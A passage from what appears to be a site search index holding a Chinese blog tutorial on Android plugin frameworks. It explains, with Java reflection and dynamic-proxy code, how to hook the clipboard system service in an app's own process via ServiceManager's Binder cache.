\u91cc\u9762\u6211\u4eec\u8bf4\u8fc7\uff0cHook\u5206\u4e3a\u4e09\u6b65\uff0c\u6700\u5173\u952e\u7684\u4e00\u6b65\u5c31\u662f\u5bfb\u627eHook\u70b9\u3002\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u641e\u6e05\u695a\u4e86\u7cfb\u7edf\u670d\u52a1\u7684\u4f7f\u7528\u8fc7\u7a0b\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u627e\u51fa\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u5728\u54ea\u4e2a\u73af\u8282\u662f\u6700\u5408\u9002hook\u7684\u3002 \u7531\u4e8e\u7cfb\u7edf\u670d\u52a1\u7684\u4f7f\u7528\u8005\u90fd\u662f\u5bf9\u7b2c\u4e8c\u6b65\u83b7\u53d6\u5230\u7684 IXXInterface \u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u5982\u679c\u6211\u4eec\u8981hook\u6389\u67d0\u4e2a\u7cfb\u7edf\u670d\u52a1\uff0c \u53ea\u9700\u8981\u628a\u7b2c\u4e8c\u6b65\u7684 asInterface \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u4fee\u6539\u4e3a\u4e3a\u6211\u4eecHook\u8fc7\u7684\u5bf9\u8c61\u5c31\u53ef\u4ee5\u4e86\u3002 asInterface\u8fc7\u7a0b \u63a5\u4e0b\u6765\u6211\u4eec\u5206\u6790 asInterface \u65b9\u6cd5\uff0c\u7136\u540e\u60f3\u529e\u6cd5\u628a\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4fee\u6539\u4e3a\u6211\u4eecHook\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002\u8fd9\u91cc\u6211\u4eec\u4ee5\u7cfb\u7edf\u526a\u5207\u7248\u670d\u52a1\u4e3a\u4f8b\uff0c\u6e90\u7801\u4f4d\u7f6e\u4e3a android.content.IClipboard , IClipboard.Stub.asInterface \u65b9\u6cd5\u4ee3\u7801\u5982\u4e0b\uff1a public static android.content.IClipboard asInterface(android.os.IBinder obj) { if ((obj == null)) { return null; } android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); // Hook\u70b9 if (((iin != null) && (iin instanceof android.content.IClipboard))) { return ((android.content.IClipboard) iin); } return new android.content.IClipboard.Stub.Proxy(obj);} \u8fd9\u4e2a\u65b9\u6cd5\u7684\u610f\u601d\u5c31\u662f\uff1a\u5148\u67e5\u770b\u672c\u8fdb\u7a0b\u662f\u5426\u5b58\u5728\u8fd9\u4e2aBinder\u5bf9\u8c61\uff0c\u5982\u679c\u6709\u90a3\u4e48\u76f4\u63a5\u5c31\u662f\u672c\u8fdb\u7a0b\u8c03\u7528\u4e86\uff1b\u5982\u679c\u4e0d\u5b58\u5728\u90a3\u4e48\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u8ba9\u4ee3\u7406\u5bf9\u8c61\u59d4\u6258\u9a71\u52a8\u5b8c\u6210\u8de8\u8fdb\u7a0b\u8c03\u7528\u3002 \u89c2\u5bdf\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u524d\u9762\u7684\u90a3\u4e2aif\u8bed\u53e5\u5224\u7a7a\u8fd4\u56de\u80af\u5b9a\u52a8\u4e0d\u4e86\u624b\u811a\uff1b\u6700\u540e\u4e00\u53e5\u8c03\u7528\u6784\u9020\u51fd\u6570\u7136\u540e\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4e5f\u662f\u65e0\u4ece\u4e0b\u624b\uff0c\u8981\u4fee\u6539 asInterface \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u6211\u4eec\u552f\u4e00\u80fd\u505a\u7684\u5c31\u662f\u4ece\u8fd9\u4e00\u53e5\u4e0b\u624b\uff1a android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); // Hook\u70b9 \u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u8fd9\u4e2a obj \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u5e76\u4fdd\u8bc1\u8fd9\u4e2a\u8fd4\u56de\u503c\u7b26\u5408\u63a5\u4e0b\u6765\u7684 if \u6761\u4ef6\u68c0\u6d4b\uff0c\u90a3\u4e48\u5c31\u8fbe\u5230\u4e86\u4fee\u6539 asInterface \u65b9\u6cd5\u8fd4\u56de\u503c\u7684\u76ee\u7684\u3002 \u800c\u8fd9\u4e2a obj \u5bf9\u8c61\u521a\u597d\u662f\u6211\u4eec\u7b2c\u4e00\u6b65\u8fd4\u56de\u7684 IBinder \u5bf9\u8c61\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u5bf9\u8fd9\u4e2a IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u8fdb\u884chook\u3002 getService\u8fc7\u7a0b \u4e0a\u6587\u5206\u6790\u5f97\u77e5\uff0c\u6211\u4eec\u60f3\u8981\u4fee\u6539 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\uff1b\u83b7\u53d6 IBinder \u5bf9\u8c61\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a IBinder b = ServiceManager.getService(\"service_name\"); \u56e0\u6b64\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u4fee\u6539\u8fd9\u4e2a getService \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u8ba9\u8fd9\u4e2a\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6211\u4eec\u4f2a\u9020\u8fc7\u7684 IBinder \u5bf9\u8c61\uff1b\u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u81ea\u5df1\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u4f5c\u5904\u7406\uff0c\u8fdb\u800c\u4f7f\u5f97 asInterface \u65b9\u6cd5\u8fd4\u56de\u5728 queryLocalInterface \u65b9\u6cd5\u91cc\u9762\u5904\u7406\u8fc7\u7684\u503c\uff0c\u6700\u7ec8\u5b9e\u73b0hook\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\u3002 \u5728\u8ddf\u8e2a\u8fd9\u4e2a getService \u65b9\u6cd5\u4e4b\u524d\u6211\u4eec\u601d\u8003\u4e00\u4e0b\uff0c\u7531\u4e8e\u7cfb\u7edf\u670d\u52a1\u662f\u4e00\u7cfb\u5217\u7684\u8fdc\u7a0bService\uff0c\u5b83\u4eec\u7684\u672c\u4f53\uff0c\u4e5f\u5c31\u662fBinder\u672c\u5730\u5bf9\u8c61\u4e00\u822c\u90fd\u5b58\u5728\u4e8e\u67d0\u4e2a\u5355\u72ec\u7684\u8fdb\u7a0b\uff0c\u5728\u8fd9\u4e2a\u8fdb\u7a0b\u4e4b\u5916\u7684\u5176\u4ed6\u8fdb\u7a0b\u5b58\u5728\u7684\u90fd\u662f\u8fd9\u4e9bBinder\u672c\u5730\u5bf9\u8c61\u7684\u4ee3\u7406\u3002\u56e0\u6b64\u5728\u6211\u4eec\u7684\u8fdb\u7a0b\u91cc\u9762\uff0c\u5b58\u5728\u7684\u4e5f\u53ea\u662f\u8fd9\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61\uff0c\u6211\u4eec\u4e5f\u53ea\u80fd\u5bf9\u8fd9\u4e9bBinder\u4ee3\u7406\u5bf9\u8c61\u4e0b\u624b\u3002(\u5982\u679c\u8fd9\u4e00\u6bb5\u770b\u4e0d\u61c2\uff0c\u5efa\u8bae\u4e0d\u8981\u5f80\u4e0b\u770b\u4e86\uff0c\u5148\u770b Binder\u5b66\u4e60\u6307\u5357 ) \u7136\u540e\uff0c\u8fd9\u4e2a getService \u662f\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u5982\u679c\u6b64\u65b9\u6cd5\u4ec0\u4e48\u90fd\u4e0d\u505a\uff0c\u62ff\u5230Binder\u4ee3\u7406\u5bf9\u8c61\u4e4b\u540e\u76f4\u63a5\u8fd4\u56de\uff1b\u90a3\u4e48\u6211\u4eec\u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\uff1a\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\u62e6\u622a\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u83b7\u53d6\u5230\u8fd9\u4e2a\u9759\u6001\u65b9\u6cd5\u91cc\u9762\u7684\u5c40\u90e8\u53d8\u91cf(\u5373\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684\u90a3\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61)\u3002 \u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u770b\u8fd9\u4e2a getService \u7684\u4ee3\u7801\u4e86\uff1a public static IBinder getService(String name) { try { IBinder service = sCache.get(name); if (service != null) { return service; } else { return getIServiceManager().getService(name); } } catch (RemoteException e) { Log.e(TAG, \"error in getService\", e); } return null;} \u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff01 ServiceManager \u4e3a\u4e86\u907f\u514d\u6bcf\u6b21\u90fd\u8fdb\u884c\u8de8\u8fdb\u7a0b\u901a\u4fe1\uff0c\u628a\u8fd9\u4e9bBinder\u4ee3\u7406\u5bf9\u8c61\u7f13\u5b58\u5728\u4e00\u5f20 map \u91cc\u9762\u3002 \u6211\u4eec\u53ef\u4ee5\u66ff\u6362\u8fd9\u4e2amap\u91cc\u9762\u7684\u5185\u5bb9\u4e3aHook\u8fc7\u7684 IBinder \u5bf9\u8c61\uff0c\u7531\u4e8e\u7cfb\u7edf\u5728 getService \u7684\u65f6\u5019\u6bcf\u6b21\u90fd\u4f1a\u4f18\u5148\u67e5\u627e\u7f13\u5b58\uff0c\u56e0\u6b64\u8fd4\u56de\u7ed9\u4f7f\u7528\u8005\u7684\u90fd\u662f\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684\u5bf9\u8c61\uff0c\u4ece\u800c\u8fbe\u5230\u7792\u5929\u8fc7\u6d77\u7684\u76ee\u7684\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u8981\u8fbe\u5230\u4fee\u6539\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\uff0c\u6211\u4eec\u9700\u8981\u5982\u4e0b\u4e24\u6b65\uff1a \u9996\u5148\u80af\u5b9a\u9700\u8981 \u4f2a\u9020\u4e00\u4e2a\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61 \uff0c\u63a5\u4e0b\u6765\u5c31\u8981\u60f3\u529e\u6cd5\u8ba9 asInterface \u80fd\u591f\u8fd4\u56de\u6211\u4eec\u7684\u8fd9\u4e2a\u4f2a\u9020\u5bf9\u8c61\u800c\u4e0d\u662f\u539f\u59cb\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002 \u901a\u8fc7\u4e0a\u6587\u5206\u6790\u6211\u4eec\u77e5\u9053\uff0c\u53ea\u8981\u8ba9 getService \u8fd4\u56de IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u5c31\u80fd\u8fbe\u5230\u76ee\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u9700\u8981 \u4f2a\u9020\u4e00\u4e2aIBinder\u5bf9\u8c61 \uff0c\u4e3b\u8981\u662f\u4fee\u6539\u5b83\u7684 queryLocalInterface \u65b9\u6cd5\uff0c\u8ba9\u5b83\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\uff1b\u7136\u540e\u628a\u8fd9\u4e2a\u4f2a\u9020\u5bf9\u8c61\u653e\u7f6e\u5728 ServiceManager \u7684\u7f13\u5b58 map \u91cc\u9762\u5373\u53ef\u3002 \u6211\u4eec\u901a\u8fc7Binder\u673a\u5236\u7684 \u4f18\u5148\u67e5\u627e\u672c\u5730Binder\u5bf9\u8c61 \u7684\u8fd9\u4e2a\u7279\u6027\u8fbe\u5230\u4e86Hook\u6389\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u7684\u76ee\u7684\u3002\u56e0\u6b64 queryLocalInterface \u4e5f\u5931\u53bb\u4e86\u5b83\u539f\u672c\u7684\u610f\u4e49(\u53ea\u67e5\u627e\u672c\u5730Binder\u5bf9\u8c61\uff0c\u6ca1\u6709\u672c\u5730\u5bf9\u8c61\u8fd4\u56denull)\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u662f\u4e00\u4e2a\u5080\u5121\uff0c\u662f\u6211\u4eec\u5b9e\u73b0hook\u7cfb\u7edf\u5bf9\u8c61\u7684\u6865\u6881\uff1a\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u201c\u6f0f\u6d1e\u201d\u8ba9 asInterface \u6c38\u8fdc\u90fd\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u5bf9\u8c61\u3002\u7531\u4e8e\u6211\u4eec\u63a5\u7ba1\u4e86 asInterface \u8fd9\u4e2a\u65b9\u6cd5\u7684\u5168\u90e8\uff0c\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u8fd9\u4e2a\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u4e0d\u80fd\u662f\u53ea\u62e5\u6709\u672c\u5730Binder\u5bf9\u8c61(\u539f\u59cb queryLocalInterface \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61)\u7684\u80fd\u529b\uff0c\u8fd8\u8981\u6709Binder\u4ee3\u7406\u5bf9\u8c61\u64cd\u7eb5\u9a71\u52a8\u7684\u80fd\u529b\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u4ee5Hook\u7cfb\u7edf\u7684\u526a\u5207\u7248\u670d\u52a1\u4e3a\u4f8b\uff0c\u7528\u5b9e\u9645\u4ee3\u7801\u6765\u8bf4\u660e\uff0c\u5982\u4f55Hook\u6389\u7cfb\u7edf\u670d\u52a1\u3002 Hook\u7cfb\u7edf\u526a\u5207\u7248\u670d\u52a1 \u4f2a\u9020\u526a\u5207\u7248\u670d\u52a1\u5bf9\u8c61 \u9996\u5148\u6211\u4eec\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u4f2a\u9020\u4e00\u4e2a\u526a\u5207\u7248\u670d\u52a1\u5bf9\u8c61\uff0c\u5173\u4e8e\u5982\u4f55\u4f7f\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u8fdb\u884chook\u4ee5\u53ca\u5176\u4e2d\u7684\u539f\u7406\uff0c\u53ef\u4ee5\u67e5\u770b \u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4b\u52a8\u6001\u4ee3\u7406 \u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u6211\u4eec\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0fHook\u6389\u4e86 hasPrimaryClip() \uff0c getPrimaryClip() \u8fd9\u4e24\u4e2a\u65b9\u6cd5\uff1a public class BinderHookHandler implements InvocationHandler { private static final String TAG = \"BinderHookHandler\"; // \u539f\u59cb\u7684Service\u5bf9\u8c61 (IInterface) Object base; public BinderHookHandler(IBinder base, Class<?> stubClass) { try { Method asInterfaceMethod = stubClass.getDeclaredMethod(\"asInterface\", IBinder.class); // IClipboard.Stub.asInterface(base); this.base = asInterfaceMethod.invoke(null, base); } catch (Exception e) { throw new RuntimeException(\"hooked failed!\"); } } @TargetApi(Build.VERSION_CODES.HONEYCOMB) @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // \u628a\u526a\u5207\u7248\u7684\u5185\u5bb9\u66ff\u6362\u4e3a \"you are hooked\" if (\"getPrimaryClip\".equals(method.getName())) { Log.d(TAG, \"hook getPrimaryClip\"); return ClipData.newPlainText(null, \"you are hooked\"); } // \u6b3a\u9a97\u7cfb\u7edf,\u4f7f\u4e4b\u8ba4\u4e3a\u526a\u5207\u7248\u4e0a\u4e00\u76f4\u6709\u5185\u5bb9 if (\"hasPrimaryClip\".equals(method.getName())) { return true; } return method.invoke(base, args); }} \u6ce8\u610f\uff0c\u6211\u4eec\u62ff\u5230\u539f\u59cb\u7684 IBinder \u5bf9\u8c61\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u88abHook\u4e4b\u524d\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u5e76\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a IBinder \u5bf9\u8c61\uff0c\u800c\u662f\u9700\u8981\u4f7f\u7528 asInterface \u65b9\u6cd5\u5c06\u5b83\u8f6c\u6362\u4e3a IClipboard \u63a5\u53e3\uff1b\u56e0\u4e3a getService \u65b9\u6cd5\u8fd4\u56de\u7684 IBinder \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a \u88f8Binder\u4ee3\u7406\u5bf9\u8c61 \uff0c\u5b83\u53ea\u6709\u4e0e\u9a71\u52a8\u6253\u4ea4\u9053\u7684\u80fd\u529b\uff0c\u4f46\u662f\u5b83\u5e76\u4e0d\u80fd\u72ec\u7acb\u5de5\u4f5c\uff0c\u9700\u8981\u4eba\u6307\u6325\u5b83\uff1b asInterface \u65b9\u6cd5\u8fd4\u56de\u7684 IClipboard.Stub.Proxy \u7c7b\u7684\u5bf9\u8c61\u901a\u8fc7\u64cd\u7eb5\u8fd9\u4e2a\u88f8 BinderProxy \u5bf9\u8c61\u4ece\u800c\u5b9e\u73b0\u4e86\u5177\u4f53\u7684 IClipboard \u63a5\u53e3\u5b9a\u4e49\u7684\u64cd\u4f5c\u3002 \u4f2a\u9020 IBinder \u5bf9\u8c61 \u5728\u4e0a\u4e00\u6b65\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4f2a\u9020\u597d\u4e86\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\uff0c\u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u60f3\u529e\u6cd5\u8ba9 asInterface \u65b9\u6cd5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684\u5bf9\u8c61\u4e86\uff1b\u6211\u4eec\u4f2a\u9020\u4e00\u4e2a IBinder \u5bf9\u8c61\uff1a public class BinderProxyHookHandler implements InvocationHandler { private static final String TAG = \"BinderProxyHookHandler\"; // \u7edd\u5927\u90e8\u5206\u60c5\u51b5\u4e0b,\u8fd9\u662f\u4e00\u4e2aBinderProxy\u5bf9\u8c61 // \u53ea\u6709\u5f53Service\u548c\u6211\u4eec\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u7684\u65f6\u5019\u624d\u662fBinder\u672c\u5730\u5bf9\u8c61 // \u8fd9\u4e2a\u57fa\u672c\u4e0d\u53ef\u80fd IBinder base; Class<?> stub; Class<?> iinterface; public BinderProxyHookHandler(IBinder base) { this.base = base; try { this.stub = Class.forName(\"android.content.IClipboard$Stub\"); this.iinterface = Class.forName(\"android.content.IClipboard\"); } catch (ClassNotFoundException e) { e.printStackTrace(); } } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (\"queryLocalInterface\".equals(method.getName())) { Log.d(TAG, \"hook queryLocalInterface\"); // \u8fd9\u91cc\u76f4\u63a5\u8fd4\u56de\u771f\u6b63\u88abHook\u6389\u7684Service\u63a5\u53e3 // \u8fd9\u91cc\u7684 queryLocalInterface \u5c31\u4e0d\u662f\u539f\u672c\u7684\u610f\u601d\u4e86 // \u6211\u4eec\u80af\u5b9a\u4e0d\u4f1a\u771f\u7684\u8fd4\u56de\u4e00\u4e2a\u672c\u5730\u63a5\u53e3, \u56e0\u4e3a\u6211\u4eec\u63a5\u7ba1\u4e86 asInterface\u65b9\u6cd5\u7684\u4f5c\u7528 // \u56e0\u6b64\u5fc5\u987b\u662f\u4e00\u4e2a\u5b8c\u6574\u7684 asInterface \u8fc7\u7684 IInterface\u5bf9\u8c61, \u65e2\u8981\u5904\u7406\u672c\u5730\u5bf9\u8c61,\u4e5f\u8981\u5904\u7406\u4ee3\u7406\u5bf9\u8c61 // \u8fd9\u53ea\u662f\u4e00\u4e2aHook\u70b9\u800c\u5df2, \u5b83\u539f\u59cb\u7684\u542b\u4e49\u5df2\u7ecf\u88ab\u6211\u4eec\u91cd\u5b9a\u4e49\u4e86; \u56e0\u4e3a\u6211\u4eec\u4f1a\u6c38\u8fdc\u786e\u4fdd\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u8fd4\u56denull // \u8ba9 IClipboard.Stub.asInterface \u6c38\u8fdc\u8d70\u5230if\u8bed\u53e5\u7684else\u5206\u652f\u91cc\u9762 return Proxy.newProxyInstance(proxy.getClass().getClassLoader(), // asInterface \u7684\u65f6\u5019\u4f1a\u68c0\u6d4b\u662f\u5426\u662f\u7279\u5b9a\u7c7b\u578b\u7684\u63a5\u53e3\u7136\u540e\u8fdb\u884c\u5f3a\u5236\u8f6c\u6362 // \u56e0\u6b64\u8fd9\u91cc\u7684\u52a8\u6001\u4ee3\u7406\u751f\u6210\u7684\u7c7b\u578b\u4fe1\u606f\u7684\u7c7b\u578b\u5fc5\u987b\u662f\u6b63\u786e\u7684 new Class[] { IBinder.class, IInterface.class, this.iinterface }, new BinderHookHandler(base, stub)); } Log.d(TAG, \"method:\" + method.getName()); return method.invoke(base, args); }} \u6211\u4eec\u4f7f\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0f\u4f2a\u9020\u4e86\u4e00\u4e2a\u8ddf\u539f\u59cb IBinder \u4e00\u6a21\u4e00\u6837\u7684\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u8fd9\u4e2a\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u91cc\u9762\u8fd4\u56de\u4e86\u6211\u4eec\u7b2c\u4e00\u6b65\u521b\u5efa\u7684 \u4f2a\u9020\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61 \uff1b\u6ce8\u610f\u770b\u6ce8\u91ca\uff0c\u8be6\u7ec6\u89e3\u91ca\u53ef\u4ee5\u770b \u4ee3\u7801 \u66ff\u6362ServiceManager\u7684 IBinder \u5bf9\u8c61 \u73b0\u5728\u5c31\u662f\u4e07\u4e8b\u5177\u5907\uff0c\u53ea\u6b20\u4e1c\u98ce\u4e86\uff1b\u6211\u4eec\u4f7f\u7528\u53cd\u5c04\u7684\u65b9\u5f0f\u4fee\u6539 ServiceManager \u7c7b\u91cc\u9762\u7f13\u5b58\u7684Binder\u5bf9\u8c61\uff0c\u4f7f\u5f97 getService \u65b9\u6cd5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\uff0c\u8fdb\u800c asInterface \u65b9\u6cd5\u4f7f\u7528\u4f2a\u9020 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u8fd4\u56de\u4e86\u6211\u4eec\u4f2a\u9020\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002\u4ee3\u7801\u8f83\u7b80\u5355\uff0c\u5982\u4e0b\uff1a final String CLIPBOARD_SERVICE = \"clipboard\";// \u4e0b\u9762\u8fd9\u4e00\u6bb5\u7684\u610f\u601d\u5b9e\u9645\u5c31\u662f: ServiceManager.getService(\"clipboard\");// \u53ea\u4e0d\u8fc7 ServiceManager\u8fd9\u4e2a\u7c7b\u662f@hide\u7684Class<?> serviceManager = Class.forName(\"android.os.ServiceManager\");Method getService = serviceManager.getDeclaredMethod(\"getService\", String.class);// ServiceManager\u91cc\u9762\u7ba1\u7406\u7684\u539f\u59cb\u7684Clipboard Binder\u5bf9\u8c61// \u4e00\u822c\u6765\u8bf4\u8fd9\u662f\u4e00\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61IBinder rawBinder = (IBinder) getService.invoke(null, CLIPBOARD_SERVICE);// Hook \u6389\u8fd9\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5// \u7136\u540e\u5728 queryLocalInterface \u8fd4\u56de\u4e00\u4e2aIInterface\u5bf9\u8c61, hook\u6389\u6211\u4eec\u611f\u5174\u8da3\u7684\u65b9\u6cd5\u5373\u53ef.IBinder hookedBinder = (IBinder) Proxy.newProxyInstance(serviceManager.getClassLoader(), new Class<?>[] { IBinder.class }, new BinderProxyHookHandler(rawBinder));// \u628a\u8fd9\u4e2ahook\u8fc7\u7684Binder\u4ee3\u7406\u5bf9\u8c61\u653e\u8fdbServiceManager\u7684cache\u91cc\u9762// \u4ee5\u540e\u67e5\u8be2\u7684\u65f6\u5019 \u4f1a\u4f18\u5148\u67e5\u8be2\u7f13\u5b58\u91cc\u9762\u7684Binder, \u8fd9\u6837\u5c31\u4f1a\u4f7f\u7528\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684Binder\u4e86Field cacheField = serviceManager.getDeclaredField(\"sCache\");cacheField.setAccessible(true);Map<String, IBinder> cache = (Map) cacheField.get(null);cache.put(CLIPBOARD_SERVICE, hookedBinder); \u63a5\u4e0b\u6765\uff0c\u5728app\u91cc\u9762\u4f7f\u7528\u526a\u5207\u7248\uff0c\u6bd4\u5982\u957f\u6309\u8fdb\u884c\u7c98\u8d34\u4e4b\u540e\uff0c\u526a\u5207\u7248\u7684\u5185\u5bb9\u6c38\u8fdc\u90fd\u662f you are hooked \u4e86\uff1b\u8fd9\u6837\uff0c\u6211\u4eecHook\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\u5ba3\u544a\u5b8c\u6210\uff01\u8be6\u7ec6\u7684\u4ee3\u7801\u53c2\u89c1 github \u3002 \u4e5f\u8bb8\u4f60\u4f1a\u95ee\uff0c\u63d2\u4ef6\u6846\u67b6\u4f1a\u8fd9\u4e48hook\u5417\uff1f\u5982\u679c\u4e0d\u662f\u90a3\u4e48\u63d2\u4ef6\u6846\u67b6hook\u8fd9\u4e9b\u5e72\u4ec0\u4e48\uff1f\u63d2\u4ef6\u6846\u67b6\u5f53\u7136\u4e0d\u4f1a\u505a\u66ff\u6362\u6587\u672c\u8fd9\u4e48\u65e0\u804a\u7684\u4e8b\u60c5\uff0cDroidPlugin\u63d2\u4ef6\u6846\u67b6\u7ba1\u7406\u63d2\u4ef6\u4f7f\u5f97\u63d2\u4ef6\u5c31\u50cf\u662f\u4e3b\u7a0b\u5e8f\u4e00\u6837\uff0c\u56e0\u6b64\u63d2\u4ef6\u9700\u8981\u4f7f\u7528\u4e3b\u7a0b\u5e8f\u7684\u526a\u5207\u7248\uff0c\u63d2\u4ef6\u4e4b\u95f4\u4e5f\u4f1a\u5171\u7528\u526a\u5207\u7248\uff1b\u5176\u4ed6\u7684\u4e00\u4e9b\u7cfb\u7edf\u670d\u52a1\u4e5f\u7c7b\u4f3c\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8fbe\u5230\u63d2\u4ef6\u548c\u5bbf\u4e3b\u7a0b\u5e8f\u4e4b\u95f4\u7684\u5929\u8863\u670d\u7f1d\uff0c\u6c34\u4e73\u4ea4\u878d\uff01\u53e6\u5916\uff0c ActivityManager \u4ee5\u53ca PackageManager \u8fd9\u4e24\u4e2a\u7cfb\u7edf\u670d\u52a1\u867d\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0fhook\uff0c\u4f46\u662f\u7531\u4e8e\u5b83\u4eec\u7684\u91cd\u8981\u6027\u548c\u7279\u6b8a\u6027\uff0cDroidPlugin\u4f7f\u7528\u4e86\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u4f1a\u5355\u72ec\u8bb2\u89e3\u3002 \u559c\u6b22\u5c31\u70b9\u4e2a\u8d5e\u5427\uff5e\u6301\u7eed\u66f4\u65b0\uff0c\u8bf7\u5173\u6ce8github\u9879\u76ee understand-plugin-framework \u548c\u6211\u7684 \u535a\u5ba2 ! \u539f\u6587\u94fe\u63a5\uff1a https://weishu.me/2016/02/16/understand-plugin-framework-binder-hook/","title":"Android\u63d2\u4ef6\u5316\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4bBinder Hook"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#androidhookbinder-hook","text":"Android\u7cfb\u7edf\u901a\u8fc7Binder\u673a\u5236\u7ed9\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u8bf8\u5982 ActivityManagerService \uff0c ClipboardManager \uff0c AudioManager \u7b49\uff1b\u8fd9\u4e9b\u5e7f\u6cdb\u5b58\u5728\u7cfb\u7edf\u670d\u52a1\u7ed9\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u8bf8\u5982\u4efb\u52a1\u7ba1\u7406\uff0c\u97f3\u9891\uff0c\u89c6\u9891\u7b49\u5f02\u5e38\u5f3a\u5927\u7684\u529f\u80fd\u3002 